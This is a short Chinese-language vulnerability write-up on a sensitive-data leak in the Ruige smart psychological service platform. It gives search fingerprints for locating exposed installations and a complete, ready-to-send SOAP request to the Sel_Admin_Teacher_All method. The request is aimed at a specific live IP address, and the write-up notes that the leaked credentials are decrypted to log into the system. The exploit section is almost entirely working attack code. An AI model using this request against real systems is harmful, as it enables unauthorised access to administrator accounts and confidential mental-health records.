### 一、漏洞描述
 瑞格智慧心理服务平台是一家致力于提供个性化心理健康支持的平台。通过先进的AI技术和专业心理学家团队，为用户提供定制化的心理评估和个性化的心理咨询服务。平台注重隐私保护和数据安全，用户可以安全、便捷地接受在线咨询和心理指导，帮助他们理解和应对各种心理健康挑战，提升生活质量和心理健康水平。瑞格智慧心理服务平台Sel_Admin_Teacher_All存在敏感信息泄露漏洞

### 二、影响版本
智慧平台

### 三、资产测绘
```plain
web.icon=="9d305e4b4f7603ccac03b0e535049ba0"
body="指纹登录\",\"请安装指纹驱动或启动服务"
```

![](images/1719472952366-6389de4f-dc42-45b1-9214-ac525a1d6838.png)

### 四、漏洞复现
```plain
POST /NPreenManage/NPreenSMSList.asmx HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=nsoaozjclmg0plovofpkcjqu
Connection: close
SOAPAction: RuiGe.WebUi.NPreenSMS/Sel_Admin_Teacher_All
Content-Type: text/xml;charset=UTF-8
Host: 218.28.138.35:8888
Content-Length: 230

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ruig="RuiGe.WebUi.NPreenSMS">
   <soapenv:Header/>
   <soapenv:Body>
      <ruig:Sel_Admin_Teacher_All/>
   </soapenv:Body>
</soapenv:Envelope>
```

![](images/1723624081359-915ed91b-27d6-42a7-a13a-863d53d09dd5.png)

解密后登录系统

![](images/1723624308398-07db3e8e-3795-4e58-bfbd-134f3cc792f2.png)

